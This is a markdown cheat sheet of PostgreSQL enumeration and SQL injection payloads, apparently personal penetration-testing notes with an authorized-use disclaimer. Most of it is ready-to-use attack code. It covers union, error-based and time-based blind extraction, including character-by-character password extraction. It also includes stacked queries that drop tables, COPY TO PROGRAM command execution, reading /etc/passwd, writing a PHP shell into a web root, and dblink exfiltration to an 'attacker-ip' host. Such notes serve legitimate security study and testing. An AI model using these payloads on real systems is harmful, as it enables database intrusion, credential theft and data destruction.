# PostgreSQL Enumeration & SQL Injection Cheat Sheet (VAPT Research Notes)

> Personal research notes for authorized VAPT / lab practices.

---

## 1. Schema Reference

| Object | Type | Purpose |
|---|---|---|
| `public` | Default schema | Default location for user tables |
| `pg_catalog` | System schema | Core system catalogs (tables, columns, types, roles) |
| `information_schema` | ANSI schema | Standardized metadata views (TABLES, COLUMNS, VIEWS) |
| Roles (`pg_roles`, `pg_user`) | Not a schema | Login/permission management |

### Key system catalogs (pg_catalog)
```sql
pg_catalog.pg_tables
pg_catalog.pg_class
pg_catalog.pg_namespace     -- schemas
pg_catalog.pg_database
pg_catalog.pg_roles
pg_catalog.pg_user
pg_catalog.pg_proc          -- functions/procedures
pg_catalog.pg_indexes
```

### Naming convention
```sql
schema_name.table_name   -- database switching mid-query is NOT possible; one DB per connection
```

---

## 2. Basic Recon Syntax

```sql
SELECT version();                        -- Full version banner
SELECT current_database();               -- Current database name
SELECT current_user;                      -- Current logged-in user (no parens needed)
SELECT session_user;                      -- Session-level user
SELECT inet_server_addr();                -- Server IP
SELECT COUNT(*) FROM table_name;          -- Row count
SELECT schema_name FROM information_schema.schemata;   -- List schemas
```

> Note: unlike MySQL/MSSQL, PostgreSQL does **not** allow cross-database queries in a single connection — you can only enumerate databases by name, not query across them directly (without `dblink`/`postgres_fdw`).

---

## 3. Enumerating Databases

```sql
SELECT datname FROM pg_database;
SELECT datname FROM pg_database WHERE datistemplate = false;   -- exclude template DBs
```

---

## 4. Enumerating Tables

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema='public';
SELECT tablename FROM pg_catalog.pg_tables WHERE schemaname='public';
SELECT relname FROM pg_class WHERE relkind='r';
```

---

## 5. Enumerating Columns

```sql
SELECT column_name FROM information_schema.columns WHERE table_name='users';
SELECT column_name FROM information_schema.columns WHERE table_name='users' AND table_schema='public';
```

---

## 6. Dumping Records

```sql
SELECT * FROM public.users;                 -- schema.table
SELECT * FROM Persons WHERE ID = 1;
SELECT * FROM Persons LIMIT 10;              -- "TOP 10" equivalent
SELECT * FROM Persons LIMIT 1 OFFSET 5;      -- pagination for blind extraction
```

---

## 7. Error-Based Injection

PostgreSQL error-based extraction commonly abuses type-cast errors (`::int`, `CAST`) since Postgres is strict about types.

### Classic type-cast error
```sql
SELECT CAST((SELECT version()) AS INT);
SELECT (SELECT version())::int;
```

### CAST inside a subquery (common injectable pattern)
```sql
SELECT CAST((SELECT current_user) AS INT);
```

### Forcing an error via invalid array/date cast (alternative when CAST is filtered)
```sql
SELECT CAST(current_database() AS INT);
```

### Enumerate version
```sql
SELECT CAST(version() AS INT);
```

### Enumerate table names one by one
```sql
SELECT CAST((SELECT table_name FROM information_schema.tables
             WHERE table_schema='public'
             ORDER BY table_name LIMIT 1 OFFSET 0) AS INT);
```

> PostgreSQL error messages are less verbose than MySQL/MSSQL by default — error-based extraction here typically only confirms/denies (boolean), unless `CAST` failure messages happen to embed the offending value (version-dependent).

---

## 8. Union-Based Injection

```sql
SELECT username, password FROM users WHERE username='' UNION SELECT NULL, version();
SELECT username, password FROM users WHERE username='' UNION SELECT NULL, current_database();
SELECT username, password FROM users WHERE username='' UNION SELECT NULL, table_name FROM information_schema.tables;
SELECT username, password FROM users WHERE username='' UNION SELECT NULL, column_name FROM information_schema.columns where table_name='users';
SELECT username, password FROM users WHERE username='' UNION SELECT NULL, string_agg(table_name, ',') FROM information_schema.tables WHERE table_schema='public';
```

> `string_agg()` is PostgreSQL's equivalent of MySQL's `GROUP_CONCAT()` — merges multiple rows into one string to reduce request count.

---

## 9. Time-Based Blind Injection

```sql
SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END;
SELECT pg_sleep(5) WHERE current_database() = 'target_db';
SELECT 1=1 AND (SELECT 1 FROM pg_sleep(5));
```

### Extracting data character-by-character
```sql
SELECT CASE WHEN (SUBSTRING((SELECT current_user),1,1) = 'p') THEN pg_sleep(5) ELSE pg_sleep(0) END;
SELECT CASE WHEN (ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 100) THEN pg_sleep(5) ELSE pg_sleep(0) END;
```

---

## 10. Hex Encoding Output

```sql
SELECT encode('Kaif'::bytea, 'hex');
SELECT encode(current_database()::bytea, 'hex');
SELECT decode('4b616966', 'hex');            -- reverse: hex back to bytea
```

### Error-based extraction with hex-encoded output
```sql
SELECT CAST(encode(current_database()::bytea, 'hex') AS INT);
```

---

## 11. Additional Techniques Worth Testing

### Stacked queries
PostgreSQL supports multiple statements per query when the client/driver allows it:
```sql
'; DROP TABLE test_table--
'; CREATE TABLE pwn(data text)--
```

### Command execution (requires superuser + specific extensions)
```sql
-- COPY ... TO/FROM PROGRAM requires superuser privileges
COPY (SELECT '') TO PROGRAM 'whoami';
```

### Reading/writing files (requires superuser)
```sql
SELECT pg_read_file('/etc/passwd');
COPY (SELECT 'shell code') TO '/var/www/html/shell.php';
```

### Out-of-band (OOB) exfiltration via dblink (if extension available)
```sql
SELECT * FROM dblink('host=attacker-ip port=5432 dbname=x user=y password=z',
  'SELECT current_user') AS t(result text);
```

### Comment syntax
```sql
--   (single-line, needs trailing space/newline)
/* */ (multi-line)
```

### Privilege / role enumeration
```sql
SELECT rolname, rolsuper, rolcreaterole, rolcreatedb FROM pg_roles;
SELECT current_setting('is_superuser');
```

---

## Disclaimer

These notes are for authorized security testing and educational purposes only — use exclusively against systems you own or have explicit written permission to test.
